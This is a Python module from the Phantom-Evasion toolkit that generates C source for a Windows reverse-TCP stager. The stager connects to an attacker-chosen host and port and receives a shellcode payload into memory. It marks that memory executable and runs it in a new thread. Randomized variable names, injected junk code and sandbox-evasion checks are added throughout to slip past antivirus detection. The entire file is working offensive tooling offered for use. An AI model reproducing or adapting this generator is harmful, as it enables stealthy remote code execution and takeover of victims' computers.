
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import sys
from random import shuffle  
sys.path.append("Modules/payloads/auxiliar")
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import windows_evasion
from usefull import spawn_multiple_process
from usefull import close_brackets_multiproc
from usefull import CheckForBackslash



Lhost = CheckForBackslash(sys.argv[1])

Lport = sys.argv[2]

SpawnMultiProc = int(sys.argv[3])

Randvarsize = varname_creator()

Randbuff = varname_creator()

Randvar = varname_creator()

Randversion = varname_creator()

Randwsadata = varname_creator()

Randtarget = varname_creator()

Randsock = varname_creator()

RandSocket = varname_creator()

Randint = varname_creator()

Randtret = varname_creator()

Randnret = varname_creator()

Randstartb = varname_creator()

Randhand = varname_creator()

Randresult = varname_creator()

Randthread = varname_creator()

Oldprot = varname_creator()

Randbool = varname_creator()

Junkcode_01 = Junkmathinject()
Junkcode_02 = Junkmathinject()
Junkcode_03 = Junkmathinject()
Junkcode_04 = Junkmathinject()
Junkcode_05 = Junkmathinject()
Junkcode_06 = Junkmathinject()
Junkcode_07 = Junkmathinject()
Junkcode_08 = Junkmathinject()
Junkcode_09 = Junkmathinject()
Junkcode_10 = Junkmathinject()
Junkcode_11 = Junkmathinject()
Junkcode_12 = Junkmathinject()
Junkcode_13 = Junkmathinject()
Junkcode_14 = Junkmathinject()
Junkcode_15 = Junkmathinject()
Junkcode_16 = Junkmathinject()
Junkcode_17 = Junkmathinject()
Junkcode_18 = Junkmathinject()
Junkcode_19 = Junkmathinject()
Junkcode_20 = Junkmathinject()
Junkcode_21 = Junkmathinject()
Junkcode_22 = Junkmathinject()

WinEvasion_01 = windows_evasion()
WinEvasion_02 = windows_evasion()
WinEvasion_03 = windows_evasion()
WinEvasion_04 = windows_evasion()
WinEvasion_05 = windows_evasion()
WinEvasion_06 = windows_evasion()
WinEvasion_07 = windows_evasion()
WinEvasion_08 = windows_evasion()
WinEvasion_09 = windows_evasion()


Hollow_code = ""
Hollow_code += "#include <winsock2.h>\n"


Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n","#include <stdint.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode_01
Hollow_code += Junkcode_02
Hollow_code += WinEvasion_01
Hollow_code += WinEvasion_02
Hollow_code += WinEvasion_03
Hollow_code += Junkcode_03
Hollow_code += WinEvasion_04
Hollow_code += WinEvasion_05
Hollow_code += Junkcode_04
Hollow_code += WinEvasion_06
Hollow_code += WinEvasion_07
Hollow_code += WinEvasion_08
Hollow_code += WinEvasion_09
Hollow_code += Junkcode_05
Hollow_code += spawn_multiple_process(SpawnMultiProc)
Hollow_code += "HANDLE " + Randhand + "; DWORD " + Randthread + "; DWORD " + Randresult + ";\n"
Hollow_code += "ULONG64 " + Randvarsize + ";char * " + Randbuff + ";int " + Randvar + ";\n"
Hollow_code += "WORD " + Randversion + " = MAKEWORD(2,2);WSADATA " + Randwsadata + ";\n"
Hollow_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){"
Hollow_code += Junkcode_06
Hollow_code += "WSACleanup();exit(1);}\n"
Hollow_code += "struct hostent * " + Randtarget + ";struct sockaddr_in " + Randsock + ";SOCKET " + RandSocket + ";\n"
Hollow_code += RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
Hollow_code += "if (" + RandSocket + " == INVALID_SOCKET){ " + Junkcode_07 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += Junkcode_08
Hollow_code += Randtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
Hollow_code += "if (" + Randtarget + " == NULL){ " + Junkcode_09 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + Randtarget + "->h_addr, " + Randtarget + "->h_length);\n"

Hollow_code += Randsock + ".sin_family = AF_INET;\n"
Hollow_code += Junkcode_10
Hollow_code += Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
Hollow_code += "if ( connect(" + RandSocket + ", (struct sockaddr *)&" + Randsock + ", sizeof(" + Randsock + ")) ){" + Junkcode_11 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += Junkcode_12
Hollow_code += "int64_t " + Randint + " = recv(" + RandSocket + ", (char *)&" + Randvarsize + ", 4, 0);\n"
Hollow_code += "if (" + Randint + " != (4) || " + Randvarsize + " <= 0) { " + Junkcode_13 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += Randbuff + " = VirtualAlloc(0, " + Randvarsize + " + 10,MEM_COMMIT,PAGE_READWRITE);\n"
Hollow_code += "if (" + Randbuff + " == NULL) { " + Junkcode_14 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
Hollow_code += Junkcode_15
Hollow_code += Randbuff + "[0] = 0x48;\n"
Hollow_code += Randbuff + "[1] = 0xBF;\n"
Hollow_code += "memcpy(" + Randbuff + " + 2, &" + RandSocket + ", 4);\n"
Hollow_code += Junkcode_16
Hollow_code += "int64_t " + Randtret + "=0;int64_t " + Randnret + "=0;\n"
Hollow_code += "void * " + Randstartb + " = " + Randbuff + " + 10;\n"
Hollow_code += "while (" + Randnret + " < " + Randvarsize + "){\n"
Hollow_code += Randtret + " = recv(" + RandSocket + ", (char *)" + Randstartb + ", " + Randvarsize + " - " + Randnret + ", 0);\n"
Hollow_code += Randstartb + " += " + Randtret + ";" + Randnret + " += " + Randtret + ";\n"
Hollow_code += "if (" + Randtret + " == SOCKET_ERROR) {" + Junkcode_17 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}}\n"
Hollow_code += Randint + " = " + Randnret + ";\n"
Hollow_code += "DWORD " + Oldprot + ";\n"
Hollow_code += "BOOL " + Randbool + " = VirtualProtect(" + Randbuff + "," + Randvarsize + " + 10,0x40,&" + Oldprot + ");\n"
Hollow_code += Junkcode_18
Hollow_code += Randhand + " = CreateThread(NULL,0,(LPVOID)" + Randbuff + ",NULL,0,&"+ Randthread + ");\n"
Hollow_code += Junkcode_19
Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n" 
Hollow_code += close_brackets_multiproc(SpawnMultiProc)
Hollow_code += "}}}}}\n"
Hollow_code += "}else{" + Junkcode_19 + "}\n"
Hollow_code += "}else{" + Junkcode_20 + "}\n"
Hollow_code += "}else{" + Junkcode_21 + "}\n"
Hollow_code += "}else{" + Junkcode_22 + "}\n" 
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)


